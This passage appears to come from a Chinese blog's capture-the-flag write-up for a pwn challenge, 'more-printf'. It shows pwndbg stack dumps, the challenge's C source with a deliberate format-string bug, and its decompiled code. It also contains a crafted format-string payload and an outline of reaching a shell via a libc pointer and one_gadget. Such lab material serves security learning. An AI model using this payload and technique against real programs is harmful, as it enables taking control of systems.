class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;00e8&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd959070f8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xbaa72d067a954f00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;0│ rbp &lt;span class=&#34;number&#34;&gt;0x7ffd95907100&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x562fc10992c0&lt;/span&gt; (__libc_csu_init) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;8│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907108&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f25dc8e7bf7&lt;/span&gt; (__libc_start_main+&lt;span class=&#34;number&#34;&gt;231&lt;/span&gt;) ◂— mov edi, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; bt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007f2523745be7&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000003000000030&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007ffd959070f8&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007ffd95907030&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0xbaa72d067a954f00&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007f25dccb1a00&lt;/span&gt; in ?? () from ./libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007f25dccae2a0&lt;/span&gt; in ?? () from ./libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x0000562fc300d260&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007f25dc9d6151&lt;/span&gt; in __GI___libc_read (fd=&lt;span class=&#34;number&#34;&gt;-1785699856&lt;/span&gt;, buf=&lt;span class=&#34;number&#34;&gt;0x562fc300d27e&lt;/span&gt;, nbytes=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) at ../sysdeps/unix/sysv/linux/read.c:&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;0x00007f25dccb38c0&lt;/span&gt; in _IO_stdfile_2_lock () from ./libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00007f25dcedf540&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xffffffffffffffb0&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt; in ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tele $rsp&lt;span class=&#34;number&#34;&gt;-0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907000&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffd95907100&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x562fc10992c0&lt;/span&gt; (__libc_csu_init) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907008&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7f2523745be7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│ rsp &lt;span class=&#34;number&#34;&gt;0x7ffd95907010&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x3000000030&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;0&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907018&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffd959070f8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xbaa72d067a954f00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907020&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffd95907030&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f25dccb1a00&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad208b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907028&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xbaa72d067a954f00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907030&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f25dccb1a00&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad208b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffd95907038&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f25dccae2a0&lt;/span&gt; (__GI__IO_file_jumps) ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tele $rsp&lt;span class=&#34;number&#34;&gt;-0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4b8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fa5e518df44&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;148&lt;/span&gt;) ◂— mov rcx, qword ptr [rsp + &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│ rsp &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4c0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x3000000030&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;0&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc5a8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x3d76d5b605211900&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4d0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4e0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fa5e5514a00&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad208b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4d8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x3d76d5b605211900&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4e0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fa5e5514a00&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad208b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4e8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fa5e55112a0&lt;/span&gt; (__GI__IO_file_jumps) ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7ffea6ecc4f0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55e932c72260&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;%c%c%c%5c%hhn%*8$d%186326c%5$n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;题目分析&#34;&gt;&lt;a href=&#34;#题目分析&#34; class=&#34;headerlink&#34; title=&#34;题目分析&#34;&gt;&lt;/a&gt;题目分析&lt;/h1&gt;&lt;h2 id=&#34;源代码&#34;&gt;&lt;a href=&#34;#源代码&#34; class=&#34;headerlink&#34; title=&#34;源代码&#34;&gt;&lt;/a&gt;源代码&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* gcc -o more-printf -fstack-protector-all more-printf.c */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FILE *fp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0x8d9e7e558877&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;_Noreturn&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Just to save some of your time */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; *p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p = &amp;amp;p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Chall */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buffer = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//为啥要+1? 感觉好像不加也一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;wb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fgets(buffer, &lt;span class=&#34;number&#34;&gt;0x1f&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (i != &lt;span class=&#34;number&#34;&gt;0x8d9e7e558877&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = &lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(fp, buffer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;逻辑分析&#34;&gt;&lt;a href=&#34;#逻辑分析&#34; class=&#34;headerlink&#34; title=&#34;逻辑分析&#34;&gt;&lt;/a&gt;逻辑分析&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = (__int64)v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buffer = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;wb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fgets(buffer, &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( i != &lt;span class=&#34;number&#34;&gt;0x8D9E7E558877&lt;/span&gt;LL )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  i = &lt;span class=&#34;number&#34;&gt;1337LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(fp, buffer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	能够看到没有溢出,有一次格式化字符串利用的机会, 我在想是不是可以直接把返回地址修改成onegadget呢? 答案没采用这种方法,&lt;strong&gt;后面证实确实不行,一个是没有ret, 换别的函数的ret没有合适的指针(存疑)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	先用%p泄露地址,能够看到第二个地址是比较特殊的, read函数,如果可以修改后面几个字节, 改为和onegadget一样,通过枚举,alsr偏移也一样的话,就可以getshell了,onegadget的话 0x4f3d5, 有五位不同, 枚举的话还是需要挺长时间的.. (不需要通过枚举,完全可以利用现有的指针),也就是第8个参数&lt;/p&gt;
&lt;p&gt;​	__libc_start_main+231知道这里的值,加上偏移就是onegadget的值了!&lt;/p&gt;
